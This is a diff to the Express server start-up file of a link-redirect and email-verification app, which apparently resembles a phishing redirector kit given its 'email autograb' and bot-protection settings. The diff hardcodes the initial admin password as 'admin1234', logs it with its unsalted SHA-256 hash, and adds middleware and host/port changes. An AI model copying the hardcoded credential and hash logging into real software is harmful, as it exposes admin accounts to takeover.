@@ -2,7 +2,7 @@ import express, { type Request, Response, NextFunction } from "express";
 import { registerRoutes } from "./routes";
 import { setupVite, serveStatic, log } from "./vite";
 import { storage } from "./storage";
-import { db, pool } from "./db";
+import { db } from "./db";
 import { users } from "../shared/schema";
 import { eq } from "drizzle-orm";
 import { createHash } from "crypto";
@@ -12,7 +12,7 @@ import { setupAuth } from "./auth";
 const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
-
+console.log('ENV:', { HOST: process.env.HOST, PORT: process.env.PORT });
 // Function to check if admin account exists and create if not
 async function initializeAdminAccount() {
   try {
@@ -23,8 +23,8 @@ async function initializeAdminAccount() {
       // No users exist, create admin account
       log("No admin accounts found. Creating initial admin account...");
       
-      // Create a random initial password
-      const initialPassword = Math.random().toString(36).substring(2, 10);
+      // HARDCODED PASSWORD FOR TESTING
+      const initialPassword = "admin1234"; // <-- set your password here
       
       // Hash the password with a simple hash for first login
       const hashedPassword = createHash('sha256').update(initialPassword).digest('hex');
@@ -39,6 +39,7 @@ async function initializeAdminAccount() {
       console.log("🔐 INITIAL ADMIN ACCOUNT CREATED 🔐");
       console.log("Username: admin@wick3d-links.com");
       console.log(`Password: ${initialPassword}`);
+      console.log(`Password hash (DB): ${hashedPassword}`);
       console.log("Please login and change this password immediately!");
       console.log("========================================\n");
     }
@@ -48,16 +49,16 @@ async function initializeAdminAccount() {
     if (!settings) {
       await storage.updateSettings({
         redirectUrl: "https://example.com/thank-you",
-        showLoadingSpinner: true,
+        showLoadingSpinner: 1,
         loadingDuration: 3,
         successMessage: "Thank you for verifying your email address!",
-        useEmailAutograb: false,
+        useEmailAutograb: 0,
         emailAutograbParam: "email",
-        enableBotProtection: true,
+        enableBotProtection: 1,
         customThankYouPage: "",
-        useCustomThankYouPage: false,
+        useCustomThankYouPage: 0,
         securityLevel: 3,
-        useWildcards: true,
+        useWildcards: 1,
         encryptionSalt: Math.random().toString(36).substring(2, 15)
       });
       log("Default settings initialized");
@@ -105,14 +106,19 @@ app.use((req, res, next) => {
   const rateLimiters = await createRateLimiters();
   
   // Set up authentication with sessions
-  const { requireAuth } = await setupAuth(app, pool);
-  
+  const { requireAuth } = await setupAuth(app);
+
+  // Wrap requireAuth to ensure it matches Express middleware signature
+  const requireAuthMiddleware = (req: Request, res: Response, next: NextFunction) => {
+    Promise.resolve(requireAuth(req, res, next)).catch(next);
+  };
+
   // Apply rate limiters to api routes
   app.use('/api/auth', rateLimiters.auth);
   app.use('/api/verification', rateLimiters.verification);
   app.use('/api', rateLimiters.general);
   
-  const server = await registerRoutes(app, requireAuth);
+  const server = await registerRoutes(app, requireAuthMiddleware);
 
   app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
     const status = err.status || err.statusCode || 500;
@@ -131,15 +137,14 @@ app.use((req, res, next) => {
     serveStatic(app);
   }
 
-  // ALWAYS serve the app on port 5000
-  // this serves both the API and the client.
-  // It is the only port that is not firewalled.
-  const port = 5000;
+  // Use environment variables for host and port, with safe defaults
+  const port = process.env.PORT ? parseInt(process.env.PORT, 10) : 5000;
+  const host = process.env.HOST || "localhost";
   server.listen({
     port,
-    host: "0.0.0.0",
+    host,
     reusePort: true,
   }, () => {
-    log(`serving on port ${port}`);
+    log(`serving on ${host}:${port}`);
   });
 })();
